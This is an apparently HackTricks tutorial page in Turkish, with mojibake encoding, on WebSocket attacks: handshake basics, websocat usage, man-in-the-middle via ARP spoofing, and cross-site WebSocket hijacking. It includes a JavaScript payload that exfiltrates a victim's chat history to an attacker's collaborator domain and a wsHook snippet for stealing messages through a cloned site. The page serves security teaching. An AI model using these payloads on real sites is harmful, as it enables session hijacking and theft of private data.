# WebSocket SaldÄ±rÄ±larÄ±

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi** **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## WebSocket Nedir

WebSocket baÄŸlantÄ±larÄ±, baÅŸlangÄ±Ã§ta bir **HTTP** el sÄ±kÄ±ÅŸmasÄ± ile kurulur ve **uzun Ã¶mÃ¼rlÃ¼** olacak ÅŸekilde tasarlanmÄ±ÅŸtÄ±r; bu, herhangi bir zamanda iki yÃ¶nlÃ¼ mesajlaÅŸmaya olanak tanÄ±r ve bir iÅŸlem sistemine ihtiyaÃ§ duymaz. Bu, WebSocket'leri, canlÄ± finansal veri akÄ±ÅŸlarÄ± gibi **dÃ¼ÅŸÃ¼k gecikme veya sunucu baÅŸlatmalÄ± iletiÅŸim** gerektiren uygulamalar iÃ§in Ã¶zellikle avantajlÄ± hale getirir.

### WebSocket BaÄŸlantÄ±larÄ±nÄ±n Kurulumu

WebSocket baÄŸlantÄ±larÄ±nÄ±n kurulumu hakkÄ±nda ayrÄ±ntÄ±lÄ± bir aÃ§Ä±klama [**buradan**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) eriÅŸilebilir. Ã–zetle, WebSocket baÄŸlantÄ±larÄ± genellikle aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi istemci tarafÄ± JavaScript aracÄ±lÄ±ÄŸÄ±yla baÅŸlatÄ±lÄ±r:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` protokolÃ¼, **TLS** ile gÃ¼vence altÄ±na alÄ±nmÄ±ÅŸ bir WebSocket baÄŸlantÄ±sÄ±nÄ± belirtirken, `ws` **gÃ¼vensiz** bir baÄŸlantÄ±yÄ± gÃ¶sterir.

BaÄŸlantÄ± kurulumu sÄ±rasÄ±nda, tarayÄ±cÄ± ve sunucu arasÄ±nda HTTP Ã¼zerinden bir el sÄ±kÄ±ÅŸma (handshake) gerÃ§ekleÅŸtirilir. El sÄ±kÄ±ÅŸma sÃ¼reci, tarayÄ±cÄ±nÄ±n bir istek gÃ¶ndermesi ve sunucunun yanÄ±t vermesi ile ilgilidir; aÅŸaÄŸÄ±daki Ã¶rneklerde gÃ¶sterildiÄŸi gibi:

TarayÄ±cÄ± bir el sÄ±kÄ±ÅŸma isteÄŸi gÃ¶nderir:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Sunucu el sÄ±kÄ±ÅŸma yanÄ±tÄ±:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
BaÄŸlantÄ± kurulduktan sonra, her iki yÃ¶nde mesaj alÄ±ÅŸveriÅŸi iÃ§in aÃ§Ä±k kalÄ±r.

**WebSocket El SÄ±kÄ±ÅŸma Anahtar NoktalarÄ±:**

- `Connection` ve `Upgrade` baÅŸlÄ±klarÄ±, bir WebSocket el sÄ±kÄ±ÅŸmasÄ±nÄ±n baÅŸlatÄ±ldÄ±ÄŸÄ±nÄ± belirtir.
- `Sec-WebSocket-Version` baÅŸlÄ±ÄŸÄ±, genellikle `13` olan istenen WebSocket protokol sÃ¼rÃ¼mÃ¼nÃ¼ gÃ¶sterir.
- `Sec-WebSocket-Key` baÅŸlÄ±ÄŸÄ±nda, her el sÄ±kÄ±ÅŸmanÄ±n benzersiz olmasÄ±nÄ± saÄŸlayan, Base64 ile kodlanmÄ±ÅŸ rastgele bir deÄŸer gÃ¶nderilir; bu, Ã¶nbellek proxy'leri ile ilgili sorunlarÄ± Ã¶nlemeye yardÄ±mcÄ± olur. Bu deÄŸer kimlik doÄŸrulama iÃ§in deÄŸil, yanÄ±tÄ±n yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir sunucu veya Ã¶nbellek tarafÄ±ndan Ã¼retilmediÄŸini doÄŸrulamak iÃ§indir.
- Sunucunun yanÄ±tÄ±ndaki `Sec-WebSocket-Accept` baÅŸlÄ±ÄŸÄ±, `Sec-WebSocket-Key`'in bir hash'idir ve sunucunun bir WebSocket baÄŸlantÄ±sÄ± aÃ§ma niyetini doÄŸrular.

Bu Ã¶zellikler, el sÄ±kÄ±ÅŸma sÃ¼recinin gÃ¼venli ve gÃ¼venilir olmasÄ±nÄ± saÄŸlar, verimli gerÃ§ek zamanlÄ± iletiÅŸim iÃ§in zemin hazÄ±rlar.


### Linux konsolu

Bir websocket ile ham bir baÄŸlantÄ± kurmak iÃ§in `websocat` kullanabilirsiniz.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Veya bir websocat sunucusu oluÅŸturmak iÃ§in:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket baÄŸlantÄ±larÄ±

EÄŸer istemcilerin mevcut yerel aÄŸÄ±nÄ±zdan bir **HTTP websocket**'e baÄŸlÄ± olduÄŸunu bulursanÄ±z, istemci ile sunucu arasÄ±nda bir MitM saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in bir [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) denemek isteyebilirsiniz.\
Ä°stemci baÄŸlanmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda, o zaman ÅŸunu kullanabilirsiniz:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

**Websocket'lerde bilinen** **gÃ¼venlik aÃ§Ä±klarÄ±nÄ±** **keÅŸfetmek, parmak izi Ã§Ä±karmak ve aramak iÃ§in** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **aracÄ±nÄ± kullanabilirsiniz.**

### Websocket Debug tools

* **Burp Suite**, normal HTTP iletiÅŸimi iÃ§in yaptÄ±ÄŸÄ±na Ã§ok benzer bir ÅŸekilde MitM websockets iletiÅŸimini destekler.
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite eklentisi**, **geÃ§miÅŸi** alma, **yakalama kurallarÄ±** ayarlama, **eÅŸleÅŸme ve deÄŸiÅŸtirme** kurallarÄ± kullanma, **Intruder** ve **AutoRepeater** kullanarak Burp'ta Websocket iletiÅŸimlerini daha iyi yÃ¶netmenizi saÄŸlar.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** "**WebSocket/Socket.io Proxy**" kÄ±saltmasÄ± olan bu araÃ§, Node.js ile yazÄ±lmÄ±ÅŸtÄ±r ve istemci ile sunucu arasÄ±ndaki tÃ¼m WebSocket ve Socket.IO iletiÅŸimlerini **yakalamak, kesmek, Ã¶zel** mesajlar gÃ¶ndermek ve gÃ¶rÃ¼ntÃ¼lemek iÃ§in bir kullanÄ±cÄ± arayÃ¼zÃ¼ saÄŸlar.
* [**wsrepl**](https://github.com/doyensec/wsrepl), Ã¶zellikle penetrasyon testi iÃ§in tasarlanmÄ±ÅŸ bir **etkileÅŸimli websocket REPL**'dir. **Gelen websocket mesajlarÄ±nÄ± gÃ¶zlemlemek ve yenilerini gÃ¶ndermek** iÃ§in bir arayÃ¼z saÄŸlar ve bu iletiÅŸimi **otomatikleÅŸtirmek** iÃ§in kullanÄ±mÄ± kolay bir Ã§erÃ§eve sunar.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/) diÄŸer weblerle **websockets** kullanarak iletiÅŸim kurmak iÃ§in bir **web**'dir.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) diÄŸer iletiÅŸim/protokol tÃ¼rlerinin yanÄ± sÄ±ra, diÄŸer weblerle **websockets** kullanarak iletiÅŸim kurmak iÃ§in bir **web** saÄŸlar.

## Websocket Lab

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) iÃ§inde websockets kullanarak bir web baÅŸlatmak iÃ§in bir kod bulabilirsiniz ve [**bu yazÄ±da**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) bir aÃ§Ä±klama bulabilirsiniz.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, ayrÄ±ca **cross-origin WebSocket hijacking** olarak da bilinir, WebSocket el sÄ±kÄ±ÅŸmalarÄ±nÄ± etkileyen **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)**'nin Ã¶zel bir durumu olarak tanÄ±mlanÄ±r. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±, WebSocket el sÄ±kÄ±ÅŸmalarÄ±nÄ±n yalnÄ±zca **HTTP Ã§erezleri** aracÄ±lÄ±ÄŸÄ±yla **CSRF token'larÄ±** veya benzeri gÃ¼venlik Ã¶nlemleri olmadan kimlik doÄŸrulamasÄ± yaptÄ±ÄŸÄ± durumlarda ortaya Ã§Ä±kar.

SaldÄ±rganlar, savunmasÄ±z bir uygulamaya Ã§apraz alan WebSocket baÄŸlantÄ±sÄ± baÅŸlatan **kÃ¶tÃ¼ niyetli bir web sayfasÄ±** barÄ±ndÄ±rarak bunu istismar edebilir. SonuÃ§ olarak, bu baÄŸlantÄ±, uygulama ile kurbanÄ±n oturumunun bir parÃ§asÄ± olarak kabul edilir ve oturum yÃ¶netim mekanizmasÄ±ndaki CSRF korumasÄ±nÄ±n eksikliÄŸinden yararlanÄ±r.

### Simple Attack

**Websocket** baÄŸlantÄ±sÄ± **kurulduÄŸunda** **Ã§erez** sunucuya **gÃ¶nderilir**. **Sunucu**, her **belirli** **kullanÄ±cÄ±yÄ± gÃ¶nderilen Ã§erez temelinde** **websocket** **oturumu** ile **iliÅŸkilendirmek** iÃ§in bunu kullanÄ±yor olabilir.

Daha sonra, **Ã¶rneÄŸin** **websocket** **sunucusu**, bir mesaj "**READY"** gÃ¶nderildiÄŸinde bir kullanÄ±cÄ±nÄ±n **konuÅŸma geÃ§miÅŸini** geri gÃ¶nderirse, o zaman baÄŸlantÄ±yÄ± kuran **basit bir XSS** (Ã§erez **otomatik olarak** kurban kullanÄ±cÄ±sÄ±nÄ± yetkilendirmek iÃ§in **gÃ¶nderilecektir**) **"READY"** gÃ¶ndererek **konuÅŸma** **geÃ§miÅŸini** **geri alabilecektir**.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

Bu blog yazÄ±sÄ±nda [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) saldÄ±rgan, web socket iletiÅŸiminin gerÃ§ekleÅŸtiÄŸi alanÄ±n **alt alanÄ±nda rastgele Javascript Ã§alÄ±ÅŸtÄ±rmayÄ±** baÅŸardÄ±. Ã‡Ã¼nkÃ¼ bu bir **alt alan** idi, **cookie** **gÃ¶nderiliyordu** ve Ã§Ã¼nkÃ¼ **Websocket Origin'i dÃ¼zgÃ¼n kontrol etmediÄŸi iÃ§in**, onunla iletiÅŸim kurmak ve **ondan token Ã§almak** mÃ¼mkÃ¼n oldu.

### Stealing data from user

Taklit etmek istediÄŸiniz web uygulamasÄ±nÄ± kopyalayÄ±n (Ã¶rneÄŸin .html dosyalarÄ±) ve websocket iletiÅŸiminin gerÃ§ekleÅŸtiÄŸi scriptin iÃ§ine bu kodu ekleyin:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
Åimdi `wsHook.js` dosyasÄ±nÄ± [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) adresinden indirin ve **web dosyalarÄ±nÄ±n bulunduÄŸu klasÃ¶re kaydedin**.\
Web uygulamasÄ±nÄ± aÃ§arak bir kullanÄ±cÄ±nÄ±n buna baÄŸlanmasÄ±nÄ± saÄŸlarsanÄ±z, websocket Ã¼zerinden gÃ¶nderilen ve alÄ±nan mesajlarÄ± Ã§alabilirsiniz:
```javascript
sudo python3 -m http.server 80
```
## YarÄ±ÅŸ KoÅŸullarÄ±

WebSocket'lerde de YarÄ±ÅŸ KoÅŸullarÄ± vardÄ±r, [daha fazla bilgi iÃ§in burayÄ± kontrol edin](race-condition.md#rc-in-websockets).

## DiÄŸer zafiyetler

Web Sockets, **verileri sunucu tarafÄ±na ve istemci tarafÄ±na gÃ¶ndermek iÃ§in bir mekanizma** olduÄŸundan, sunucu ve istemcinin bilgileri nasÄ±l iÅŸlediÄŸine baÄŸlÄ± olarak, **Web Sockets, bir websocket Ã¼zerinden bir kullanÄ±cÄ±nÄ±n giriÅŸi ile XSS, SQLi veya diÄŸer yaygÄ±n web zafiyetlerini istismar etmek iÃ§in kullanÄ±labilir.**

## **WebSocket KaÃ§Ä±rma**

Bu zafiyet, **ters proxy kÄ±sÄ±tlamalarÄ±nÄ± aÅŸmanÄ±za** olanak tanÄ±yabilir ve onlara **bir websocket iletiÅŸiminin kurulduÄŸunu** dÃ¼ÅŸÃ¼ndÃ¼rebilir (gerÃ§ek olmasa bile). Bu, bir saldÄ±rganÄ±n **gizli uÃ§ noktalara eriÅŸmesine** olanak tanÄ±yabilir. Daha fazla bilgi iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± kontrol edin:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Referanslar

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
